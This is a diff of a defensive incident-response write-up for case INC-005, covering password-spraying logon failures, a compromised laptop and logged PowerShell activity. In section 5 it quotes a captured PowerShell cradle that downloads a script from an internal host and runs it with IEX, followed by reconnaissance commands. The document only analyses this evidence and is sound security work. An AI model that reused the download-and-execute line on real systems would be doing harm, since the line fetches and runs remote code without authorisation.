@@ -1,36 +1,100 @@
-# Evidence Analysis
+# Evidence Analysis — INC-005
 
-## 1. Windows Event ID 4625
+## 1. Windows Event ID 4625 — Failed Logon
 
-Event ID 4625 represents a failed logon attempt.
+Event ID **4625** represents a failed logon attempt.
 
-The relevant events show rapid failures against multiple accounts from the same source:
+The supplied domain-controller events show authentication failures involving multiple accounts:
 
-- `a.wilson`
-- `m.chen`
-- `j.smith`
-- `r.brown`
-- `s.patel`
+```text
+a.wilson
+m.chen
+j.smith
+r.brown
+s.patel
+```
 
-This is materially different from repeatedly guessing passwords against a single account.
+The attempts originate from:
+
+```text
+192.168.1.44
+```
+
+and occur within seconds of one another.
 
 ### Assessment
 
-The pattern is consistent with **password spraying**: attempting credentials against multiple accounts rather than repeatedly attacking only one account.
+The pattern is consistent with **password spraying**.
 
-## 2. Windows Event ID 4624
+Password spraying differs from traditional brute force because the attacker attempts a password or small set of passwords against multiple accounts rather than repeatedly attacking a single account.
 
-Event ID 4624 represents a successful logon.
+---
 
-The successful authentication to `r.brown` from `192.168.1.44` is significant because it follows multiple failed attempts against different accounts from the same source.
+## 2. Windows Event ID 4624 — Successful Logon
 
-This does not, by itself, prove that the credential was obtained through password spraying. It does establish a successful authentication that requires validation.
+Event ID **4624** represents a successful logon.
 
-## 3. Windows Event ID 4688
+At `21:14:15`, `REDGUM\r.brown` successfully authenticated from:
 
-Event ID 4688 records process creation.
+```text
+192.168.1.44
+```
 
-The process chain supplied was:
+The successful authentication occurs immediately after multiple failed authentication attempts against different accounts.
+
+### Assessment
+
+This is a significant escalation indicator.
+
+However, the event alone does not prove that the credential was compromised through password spraying. It establishes a successful authentication that requires validation.
+
+Recommended correlation includes:
+
+* user confirmation;
+* source endpoint telemetry;
+* logon type;
+* authentication package;
+* Logon ID;
+* EDR activity;
+* subsequent access to resources.
+
+---
+
+## 3. Source Endpoint
+
+The source IP was identified as:
+
+```text
+192.168.1.44
+```
+
+Asset:
+
+```text
+RG-LAPTOP-12
+```
+
+Assigned user:
+
+```text
+John Smith
+```
+
+John confirmed that he was not operating the laptop during the relevant period.
+
+### Assessment
+
+This increases confidence that the endpoint may have been operating under unauthorised control.
+
+It does not independently establish how the endpoint was compromised.
+
+---
+
+## 4. Windows Event ID 4688 — Process Creation
+
+Event ID **4688** records process creation.
+
+The supplied process chain includes:
 
 ```text
 outlook.exe
@@ -39,26 +103,72 @@ outlook.exe
                 └── whoami.exe
 ```
 
-Process creation alone is not proof of malware. The security significance comes from the process chain and surrounding authentication evidence.
+### Assessment
 
-## 4. PowerShell Event ID 4104
+The process chain is suspicious in context.
 
-The supplied Script Block Logging event contained:
+However, process creation alone does not establish malware.
+
+The significance comes from correlation with:
+
+* the preceding authentication attack;
+* the endpoint being used without the assigned user's knowledge;
+* PowerShell Script Block Logging;
+* remote script retrieval;
+* subsequent reconnaissance.
+
+---
+
+## 5. PowerShell Event ID 4104 — Script Block Logging
+
+The supplied Script Block Logging event contains:
 
 ```powershell
 $u = "http://10.10.20.15/update.ps1"
 IEX (New-Object Net.WebClient).DownloadString($u)
 ```
 
-`DownloadString()` retrieves the remote resource as a string. `IEX` / `Invoke-Expression` evaluates the resulting string as PowerShell code.
+### Analysis
 
-Therefore, the supplied evidence indicates that PowerShell retrieved remote content and executed it.
+`DownloadString()` retrieves the remote resource as a string.
 
-This is a substantially stronger finding than simply observing that `powershell.exe` ran.
+`IEX` is an alias for:
 
-## 5. Reconnaissance
+```text
+Invoke-Expression
+```
 
-The subsequent commands were:
+`Invoke-Expression` evaluates the supplied string as PowerShell code.
+
+Therefore, the evidence indicates:
+
+```text
+PowerShell
+    ↓
+Connect to 10.10.20.15
+    ↓
+Retrieve update.ps1
+    ↓
+Return content as a string
+    ↓
+Pass content to IEX
+    ↓
+Execute returned PowerShell code
+```
+
+### Important distinction
+
+The evidence establishes **remote content retrieval and dynamic execution**.
+
+It does **not** establish that `update.ps1` itself is malicious because the actual script contents have not been supplied.
+
+The script should be safely acquired, hashed, and analysed in an isolated environment.
+
+---
+
+## 6. Reconnaissance Commands
+
+The subsequent Script Block Logging event contains:
 
 ```powershell
 Get-Process
@@ -66,31 +176,88 @@ Get-Service
 whoami /all
 ```
 
-These commands can provide information about running processes, services, identity, group membership, and privileges.
+### `Get-Process`
 
-In the context of suspected compromise, this is consistent with post-compromise reconnaissance.
+Provides information about running processes.
 
-## 6. Internal IP addresses
+### `Get-Service`
 
-`192.168.1.44` and `10.10.20.15` are private IPv4 addresses.
+Provides information about installed/running Windows services.
 
-The source address therefore does not represent a public Internet source in the supplied evidence.
+### `whoami /all`
 
-`192.168.1.44` was identified as `RG-LAPTOP-12`.
+Displays the current user/security context, including identity, group membership, and privileges.
 
-`10.10.20.15` remains an important investigation target because it served the PowerShell script.
+### Assessment
 
-## 7. Evidence limitations
+In isolation, these commands can be legitimate administrative commands.
 
-The supplied dataset does not establish:
+In the context of suspected compromise, their execution immediately after remote PowerShell code execution is consistent with **post-compromise reconnaissance**.
 
-- the identity of the operator;
-- the exact contents of `update.ps1`;
-- whether `update.ps1` is malicious;
-- how the attacker gained control of `RG-LAPTOP-12`;
-- whether persistence was established;
-- whether lateral movement occurred;
-- whether privileged accounts were compromised;
-- whether data was accessed or exfiltrated.
+---
 
-These gaps should be explicitly recorded rather than filled with assumptions.
+## 7. Internal Network Addresses
+
+### `192.168.1.44`
+
+Identified as:
+
+```text
+RG-LAPTOP-12
+```
+
+This is the apparent source of the authentication activity.
+
+### `10.10.20.15`
+
+Referenced as the source of:
+
+```text
+http://10.10.20.15/update.ps1
+```
+
+The role and trustworthiness of this host are unknown.
+
+### Required investigation
+
+Determine:
+
+* hostname;
+* owner;
+* system role;
+* whether it is authorised;
+* whether it hosts legitimate scripts;
+* other systems communicating with it;
+* historical DNS/network activity;
+* endpoint security alerts.
+
+---
+
+## 8. Indicators of Interest
+
+| Indicator                       | Type        | Significance                                      |
+| ------------------------------- | ----------- | ------------------------------------------------- |
+| `192.168.1.44`                  | Internal IP | Source of authentication activity                 |
+| `10.10.20.15`                   | Internal IP | Remote script source                              |
+| `http://10.10.20.15/update.ps1` | URL         | Remote PowerShell content retrieval               |
+| `update.ps1`                    | Filename    | Referenced remote script                          |
+| `RG-LAPTOP-12`                  | Host        | Suspected compromised endpoint                    |
+| `REDGUM\r.brown`                | Account     | Successful authentication requiring investigation |
+
+---
+
+## 9. Evidence Limitations
+
+The current evidence does not establish:
+
+* attacker identity;
+* credential acquisition method;
+* exact `update.ps1` contents;
+* malware classification;
+* persistence;
+* privilege escalation;
+* lateral movement;
+* data access;
+* data exfiltration.
+
+These limitations should remain explicit in the final incident assessment.
